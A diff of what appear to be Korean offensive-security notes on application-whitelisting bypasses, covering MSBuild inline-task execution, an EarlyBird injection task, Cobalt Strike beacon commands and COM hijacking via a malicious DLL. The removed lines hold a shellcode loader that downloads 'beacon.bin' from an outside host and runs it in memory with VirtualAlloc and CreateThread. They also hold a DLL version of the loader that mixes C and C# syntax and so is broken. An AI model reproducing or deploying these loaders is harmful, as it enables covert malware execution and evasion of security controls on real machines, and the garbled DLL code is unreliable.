@@ -716,74 +716,6 @@ PS> "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --headless --
 ## Step 2. .csproj 파일 작성
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
   <Target Name="MSBuild">
-   <MSBuildTest/>
-  </Target>
-   <UsingTask
-    TaskName="MSBuildTest"
-    TaskFactory="CodeTaskFactory"
-    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
-     <Task>
-      <Code Type="Class" Language="cs">
-        <![CDATA[
-
-            using System;
-            using System.Net;
-            using System.Runtime.InteropServices;
-            using Microsoft.Build.Framework;
-            using Microsoft.Build.Utilities;
-
-            public class MSBuildTest :  Task, ITask
-            {
-                public override bool Execute()
-                {
-                    byte[] shellcode;
-                    using (var client = new WebClient())
-                    {
-                        client.BaseAddress = "http://www.bleepincomputer.com/";
-                        shellcode = client.DownloadData("beacon.bin");
-                    }
-      
-                    var hKernel = LoadLibrary("kernel32.dll");
-                    var hVa = GetProcAddress(hKernel, "VirtualAlloc");
-                    var hCt = GetProcAddress(hKernel, "CreateThread");
-
-                    var va = Marshal.GetDelegateForFunctionPointer<AllocateVirtualMemory>(hVa);
-                    var ct = Marshal.GetDelegateForFunctionPointer<CreateThread>(hCt);
-
-                    var hMemory = va(IntPtr.Zero, (uint)shellcode.Length, 0x00001000 | 0x00002000, 0x40);
-                    Marshal.Copy(shellcode, 0, hMemory, shellcode.Length);
-
-                    var t = ct(IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, IntPtr.Zero);
-                    WaitForSingleObject(t, 0xFFFFFFFF);
-
-                    return true;
-                }
-
-            [DllImport("kernel32", CharSet = CharSet.Ansi)]
-            private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
-    
-            [DllImport("kernel32", CharSet = CharSet.Ansi)]
-            private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-            [DllImport("kernel32")]
-            private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
-
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            private delegate IntPtr AllocateVirtualMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-    
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            private delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-
-            }
-
-        ]]>
-      </Code>
-    </Task>
-  </UsingTask>
-</Project>
-
-<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-  <Target Name="MSBuild">
    <EarlyBirdTask/>
   </Target>
    <UsingTask
@@ -869,6 +801,7 @@ PS> "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --headless --
     </Task>
   </UsingTask>
 </Project>
+
 ## Step 3. MSBuild.exe로 .csproj 실행
 PS> C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe test.csproj
 ```
@@ -894,48 +827,6 @@ beacon> powerpick C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe te
 PS> $ExecutionContext.SessionState.LanguageMode
 
 ## Step 2. 악성 DLL 제작
-#include <windows.h>
-#include <stdio.h>
-
-extern "C" __declspec(dllexport) BOOL execute() {
-	byte[] shellcode;
-	using (var client = new WebClient())
-	{
-		client.BaseAddress = "http://www.bleepincomputer.com/";
-		shellcode = client.DownloadData("beacon.bin");
-	}
-
-	var hKernel = LoadLibrary("kernel32.dll");
-	var hVa = GetProcAddress(hKernel, "VirtualAlloc");
-	var hCt = GetProcAddress(hKernel, "CreateThread");
-
-	var va = Marshal.GetDelegateForFunctionPointer<AllocateVirtualMemory>(hVa);
-	var ct = Marshal.GetDelegateForFunctionPointer<CreateThread>(hCt);
-
-	var hMemory = va(IntPtr.Zero, (uint)shellcode.Length, 0x00001000 | 0x00002000, 0x40);
-	Marshal.Copy(shellcode, 0, hMemory, shellcode.Length);
-
-	var t = ct(IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, IntPtr.Zero);
-	WaitForSingleObject(t, 0xFFFFFFFF);
-
-	return true;
-}
-
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
-{
-	switch (ul_reason_for_call)
-	{
-	case DLL_PROCESS_ATTACH:
-		return execute();
-	case DLL_PROCESS_DETACH:
-		break;
-	case DLL_THREAD_ATTACH:
-		break;
-	case DLL_THREAD_DETACH:
-		break;
-	}
-	return TRUE;
-}
 
 ## Step 3. HKCU에 Step 3에서 만든 악성 DLL 이름으로 가짜 COM component 등록
 PS> [System.Guid]::NewGuid()
